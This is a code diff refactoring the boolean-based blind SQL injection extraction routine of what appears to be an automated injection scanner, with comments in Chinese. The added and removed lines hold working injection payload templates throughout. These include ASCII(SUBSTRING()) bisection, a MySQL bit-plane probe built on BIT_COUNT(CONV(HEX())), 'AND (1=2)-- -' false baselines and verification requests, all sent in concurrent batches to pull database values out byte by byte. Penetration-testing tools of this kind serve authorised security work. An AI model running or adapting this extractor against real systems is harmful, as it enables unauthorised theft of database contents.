@@ -152,6 +152,25 @@ function createBaselineTracker(init, everyProbes) {
   // 盲注二分提取单个表达式字符串：长度二分 + 多字符并行二分（并发度 extractConcurrency）
 /** @param {any} ex @param {object} ctx @param {any} expr */
 export async function extractBoolean(ex, ctx, expr) {
+    const plan = _resolveExtractPlan(ex, ctx, expr);
+    if (plan === null) return null;
+    if (plan.cached !== undefined) return plan.cached;
+
+    const len = await _extractLength(ex, ctx, plan, expr);
+    if (len <= 0) return null;
+
+    const bitwise = await _extractBytesBitwise(ex, ctx, plan, expr, len);
+    if (bitwise !== null) return bitwise;
+
+    const { bytes, anyAbandoned } = await _extractBytesBisect(ex, ctx, plan, expr, len);
+    return _finalizeExtract(ex, ctx, plan, expr, bytes, anyAbandoned);
+  }
+
+  // ── extractBoolean 子过程（D54 §2.1：按职责拆分，仅传数据不共享可变状态）──────
+  // 对外签名与返回值逐字不变；请求序列、请求顺序、ctx.extractConfidence 写入时机、
+  // 缓存键结构一致（design §1.2.8 可观测行为约束）。
+
+  function _resolveExtractPlan(ex, ctx, expr) {
     const dbms = resolveDbms(ctx.dbms || 'MySQL');
     // boundary 感知：闭合前缀拼进 base，确保提取阶段的 payload 与检测阶段同构闭合
     const base = `${ctx.point.originalValue || '1'}${ctx.point.boundary || ''}`;
@@ -161,7 +180,9 @@ export async function extractBoolean(ex, ctx, expr) {
     const scanId = ctx.scanId || ctx.target?.scanId || '';
     const cacheKey = `${scanId}:${dbms}:${expr}`;
     const targetCache = ex._extractCache.get(ctx.target);
-    if (predictOutput && targetCache && targetCache.has(cacheKey)) return targetCache.get(cacheKey);
+    if (predictOutput && targetCache && targetCache.has(cacheKey)) {
+      return { cached: targetCache.get(cacheKey) };
+    }
     // [D50] 比较算子（默认 gt；between 模式见 resolveFetchUsing 注释）
     const fetchUsing = resolveFetchUsing(ctx.config);
     const lenFn = pickDialectFn(LEN_FN, dbms);
@@ -169,24 +190,13 @@ export async function extractBoolean(ex, ctx, expr) {
     const asciiFn = pickDialectFn(ASCII_FN, dbms);
     // 任一函数缺失/显式 null → 该方言此通道结构性不可用，诚实返回 null（不投无效 SQL）
     if (!lenFn || !subFn || !asciiFn) return null;
-
     // [P2-FIX 长度上界] 撞 255 上界时探测长值延伸（短值零额外请求）
     // [D50] between 模式的 BETWEEN 上界必须是「恒 ≥ 真实长度」的提取上限（lenCap），
     //   不能用当前段上界 255 —— `x BETWEEN n+1 AND 255` 在 x>255 时恒假，长值会被
     //   误判成长度 0（实测：260 字符值 between 模式返回 null）。用 lenCap 后
     //   `x ∈ (n, lenCap]` ⇔ `x > n` 对段内全部 n 恒成立，顶界语义交给 capped/延伸段。
     const lenCap = Number(ctx?.config?.blindMaxLen) > 255 ? Math.floor(ctx.config.blindMaxLen) : 4096;
-    let len = await _binarySearch(ex, ctx, base, (cmp) =>
-      `(${lenFn(expr)})${cmp}`
-    , {}, fetchUsing, lenCap);
-    if (len >= 255) {
-      len = await _extendLength(ex, ctx, base, lenFn(expr), len, fetchUsing);
-    }
-    if (len <= 0) return null;
-
     // 多字符并行二分：每轮并发探测 K 个位置，false 基准整批共用，提速约 K 倍。
-    // 字节级提取：ASCII(SUBSTRING(...)) 取该位置首字节码值(0–255)，覆盖中文等多字节字符；
-    // 全部字节收集后由 TextDecoder('utf-8') 统一还原，避免原 code>=32&&<=126 把非 ASCII 截断为空。
     const K = ctx.config?.extractConcurrency || 4;
     // P2-P2 二次确认：每字节收敛后发 1 次等值验证请求（判定与主二分完全一致：
     // 响应 ≠ false 基准即「条件为真」→ 字节等于候选值）。验证不一致 → 回退重测该字节
@@ -195,85 +205,101 @@ export async function extractBoolean(ex, ctx, expr) {
     // 注：mock oracle 等确定性目标对等值探测返回与主判定一致的结果，重测收敛到同一值，幂等。
     const rbCfg = ctx.config?.blindRobust;
     const extractVerify = rbCfg ? rbCfg.extractVerify !== false : defaults.blindRobust.extractVerify !== false;
-    const bytes = new Array(len).fill(0);
+    return { dbms, base, predictOutput, scanId, cacheKey, fetchUsing, lenFn, subFn, asciiFn, lenCap, K, extractVerify };
+  }
 
-    // [批次 11 2026-09-15] 位平面提取（opt-in config.blindBitwise === true，默认关零回归）：
-    // BIT_COUNT(CONV(HEX(SUBSTRING(expr,pos,1)),16,10) & mask) 非 0 ⇔ 字节第 bit 位为 1。
-    // 8 位并行 → 每字符 1 轮请求（二分 ~8 轮 / 字符类 ~5 轮）。仅 MySQL/TiDB 族启用；
-    // 判定复用 _dynJudge 通道；8 位收敛后整体等值验证（复用 extractVerify 语义），
-    // 任一字符验证失败 → 整体放弃位平面结果、落回下方原二分路径（保守，零漏提取）。
-    if (ctx.config?.blindBitwise === true && /^(MySQL|MariaDB|TiDB)$/i.test(resolveDbms(ctx.dbms || 'MySQL'))) {
-      const judgeB = _dynJudge(ex, ctx);
-      const bytesB = new Array(len).fill(0);
-      let bitsValid = true;
-      outer: for (let bit = 0; bit < 8 && bitsValid; bit++) {
-        const mask = 1 << bit;
-        let remainingBits = Array.from({ length: len }, (_, i) => i + 1);
-        const errBits = new Array(len + 1).fill(0);
-        while (remainingBits.length) {
-          const batchPos = remainingBits.splice(0, K);
-          const reqs = batchPos.map((pos) =>
-            `${base} AND BIT_COUNT(CONV(HEX(SUBSTRING(${expr},${pos},1)),16,10) & ${mask})-- -`
-          );
-          reqs.push(`${base} AND (1=2)-- -`);
-          const resps = await _sendBatch(ex, ctx, reqs);
-          const falseResp2 = resps[resps.length - 1];
-          if (!falseResp2) {
-            for (const pos of batchPos) {
-              errBits[pos] += 1;
-              if (errBits[pos] <= 3) remainingBits.push(pos);
-              else { bitsValid = false; break outer; }
-            }
+  async function _extractLength(ex, ctx, plan, expr) {
+    let len = await _binarySearch(ex, ctx, plan.base, (cmp) =>
+      `(${plan.lenFn(expr)})${cmp}`
+    , {}, plan.fetchUsing, plan.lenCap);
+    if (len >= 255) {
+      len = await _extendLength(ex, ctx, plan.base, plan.lenFn(expr), len, plan.fetchUsing);
+    }
+    return len;
+  }
+
+  // [批次 11 2026-09-15] 位平面提取（opt-in config.blindBitwise === true，默认关零回归）：
+  // BIT_COUNT(CONV(HEX(SUBSTRING(expr,pos,1)),16,10) & mask) 非 0 ⇔ 字节第 bit 位为 1。
+  // 8 位并行 → 每字符 1 轮请求（二分 ~8 轮 / 字符类 ~5 轮）。仅 MySQL/TiDB 族启用；
+  // 判定复用 _dynJudge 通道；8 位收敛后整体等值验证（复用 extractVerify 语义），
+  // 任一字符验证失败 → 整体放弃位平面结果、落回下方原二分路径（保守，零漏提取）。
+  // 返回 decoded string（成功）/ null（不适用或失败，调用方走原二分路径）
+  async function _extractBytesBitwise(ex, ctx, plan, expr, len) {
+    if (ctx.config?.blindBitwise !== true || !/^(MySQL|MariaDB|TiDB)$/i.test(plan.dbms)) return null;
+    const { base, K, extractVerify, asciiFn, subFn } = plan;
+    const judgeB = _dynJudge(ex, ctx);
+    const bytesB = new Array(len).fill(0);
+    let bitsValid = true;
+    outer: for (let bit = 0; bit < 8 && bitsValid; bit++) {
+      const mask = 1 << bit;
+      let remainingBits = Array.from({ length: len }, (_, i) => i + 1);
+      const errBits = new Array(len + 1).fill(0);
+      while (remainingBits.length) {
+        const batchPos = remainingBits.splice(0, K);
+        const reqs = batchPos.map((pos) =>
+          `${base} AND BIT_COUNT(CONV(HEX(SUBSTRING(${expr},${pos},1)),16,10) & ${mask})-- -`
+        );
+        reqs.push(`${base} AND (1=2)-- -`);
+        const resps = await _sendBatch(ex, ctx, reqs);
+        const falseResp2 = resps[resps.length - 1];
+        if (!falseResp2) {
+          for (const pos of batchPos) {
+            errBits[pos] += 1;
+            if (errBits[pos] <= 3) remainingBits.push(pos);
+            else { bitsValid = false; break outer; }
+          }
+          continue;
+        }
+        judgeB.observe(String(falseResp2?.data ?? ''));
+        const falseData2 = String(falseResp2?.data ?? '');
+        for (let kk = 0; kk < batchPos.length; kk++) {
+          const pos = batchPos[kk];
+          const resp = resps[kk];
+          if (!resp) {
+            errBits[pos] += 1;
+            if (errBits[pos] <= 3) remainingBits.push(pos);
+            else { bitsValid = false; break outer; }
             continue;
           }
-          judgeB.observe(String(falseResp2?.data ?? ''));
-          const falseData2 = String(falseResp2?.data ?? '');
-          for (let kk = 0; kk < batchPos.length; kk++) {
-            const pos = batchPos[kk];
-            const resp = resps[kk];
-            if (!resp) {
-              errBits[pos] += 1;
-              if (errBits[pos] <= 3) remainingBits.push(pos);
-              else { bitsValid = false; break outer; }
-              continue;
-            }
-            if (String(resp?.data ?? '') !== falseData2) bytesB[pos - 1] |= mask;
-          }
+          if (String(resp?.data ?? '') !== falseData2) bytesB[pos - 1] |= mask;
         }
-      }
-      if (bitsValid) {
-        // 整体等值验证（extractVerify 语义）：每字符 1 次确认，失败即整体回退原路径
-        if (extractVerify) {
-          for (let i = 1; i <= len && bitsValid; i++) {
-            const v = bytesB[i - 1];
-            const resps = await _sendBatch(ex, ctx, [
-              `${base} AND (${asciiFn(subFn(expr, i))}=${v})-- -`,
-              `${base} AND (1=2)-- -`,
-            ]);
-            const fd = String(resps[1]?.data ?? '');
-            if (!resps[0] || String(resps[0]?.data ?? '') === fd) bitsValid = false;
-          }
-        }
-        if (bitsValid) {
-          const decodedB = new TextDecoder('utf-8').decode(new Uint8Array(bytesB));
-          if (ctx) ctx.extractConfidence = ctx.extractConfidence || 'normal';
-          return decodedB; // 位平面成功：跳过下方原二分路径（请求量 ~1/8）
-        }
-        // 回退：重置字节数组，走下方原二分全路径
-        bytes.fill(0);
       }
     }
-    // [P0-FIX] 动态块感知真值判定（详见 _dynJudge）：收集批内 false 基准做基线
+    if (!bitsValid) return null;
+    // 整体等值验证（extractVerify 语义）：每字符 1 次确认，失败即整体回退原路径
+    if (extractVerify) {
+      for (let i = 1; i <= len && bitsValid; i++) {
+        const v = bytesB[i - 1];
+        const resps = await _sendBatch(ex, ctx, [
+          `${base} AND (${asciiFn(subFn(expr, i))}=${v})-- -`,
+          `${base} AND (1=2)-- -`,
+        ]);
+        const fd = String(resps[1]?.data ?? '');
+        if (!resps[0] || String(resps[0]?.data ?? '') === fd) bitsValid = false;
+      }
+    }
+    if (!bitsValid) return null;
+    const decodedB = new TextDecoder('utf-8').decode(new Uint8Array(bytesB));
+    if (ctx) ctx.extractConfidence = ctx.extractConfidence || 'normal';
+    return decodedB; // 位平面成功：跳过原二分路径（请求量 ~1/8）
+  }
+
+  // 字节级提取：ASCII(SUBSTRING(...)) 取该位置首字节码值(0–255)，覆盖中文等多字节字符；
+  // 全部字节收集后由 TextDecoder('utf-8') 统一还原，避免原 code>=32&&<=126 把非 ASCII 截断为空。
+  // [P0-FIX] 动态块感知真值判定（详见 _dynJudge）：收集批内 false 基准做基线
+  // [B-perf] 字符集收窄（对标 sqlmap --charset 思路）：每位置先发 1-2 次字符类探测——
+  //   ① ASCII(SUBSTRING(expr,pos,1)) BETWEEN 48 AND 57（数字）→ 命中则二分区间收窄到 [48,57]
+  //     （8 轮 → 3-4 轮，数字场景每字符 8 → 5 请求）；
+  //   ② 未命中再试小写字母区间 [97,122]（字母场景 8 → ~7 请求）；
+  //   ③ 都未命中回退全区间 [0,255]（最坏 +2 请求，收敛语义与全区间完全一致）。
+  // 判定与主二分同通道（响应 ≠ false 基准即真），确定性目标下收敛结果与全区间二分一致；
+  // 若类探测被目标抖动污染，收敛值会越界 → extractVerify 等值验证失败 → 回退全区间重测
+  // （重测跳过类探测，直接全区间二分，与旧行为一致），无回归。
+  async function _extractBytesBisect(ex, ctx, plan, expr, len) {
+    const { base, K, extractVerify, fetchUsing, asciiFn, subFn } = plan;
+    const bytes = new Array(len).fill(0);
     const judge = _dynJudge(ex, ctx);
     let anyAbandoned = false; // 有字节因重试超限被放弃 → 最终值标低置信
-    // [B-perf] 字符集收窄（对标 sqlmap --charset 思路）：每位置先发 1-2 次字符类探测——
-    //   ① ASCII(SUBSTRING(expr,pos,1)) BETWEEN 48 AND 57（数字）→ 命中则二分区间收窄到 [48,57]
-    //     （8 轮 → 3-4 轮，数字场景每字符 8 → 5 请求）；
-    //   ② 未命中再试小写字母区间 [97,122]（字母场景 8 → ~7 请求）；
-    //   ③ 都未命中回退全区间 [0,255]（最坏 +2 请求，收敛语义与全区间完全一致）。
-    // 判定与主二分同通道（响应 ≠ false 基准即真），确定性目标下收敛结果与全区间二分一致；
-    // 若类探测被目标抖动污染，收敛值会越界 → extractVerify 等值验证失败 → 回退全区间重测
-    // （重测跳过类探测，直接全区间二分，与旧行为一致），无回归。
     /** @type {Array<{ pos: number; lo: number; hi: number; phase: string; _mid?: number; _err?: any; _retries?: number }>} */
     const st = Array.from({ length: len }, (_, i) => ({
       pos: i + 1,
@@ -398,6 +424,11 @@ export async function extractBoolean(ex, ctx, expr) {
         }
       }
     }
+    return { bytes, anyAbandoned };
+  }
+
+  async function _finalizeExtract(ex, ctx, plan, expr, bytes, anyAbandoned) {
+    const { base, extractVerify, predictOutput, cacheKey } = plan;
     // 字节数组整体按 UTF-8 解码，多字节字符（中文/emoji）正确还原
     const result = new TextDecoder('utf-8').decode(Uint8Array.from(bytes));
     // [P0-FIX] NUL 污染修复收尾：有放弃字节（'?' 占位）时标记低置信，
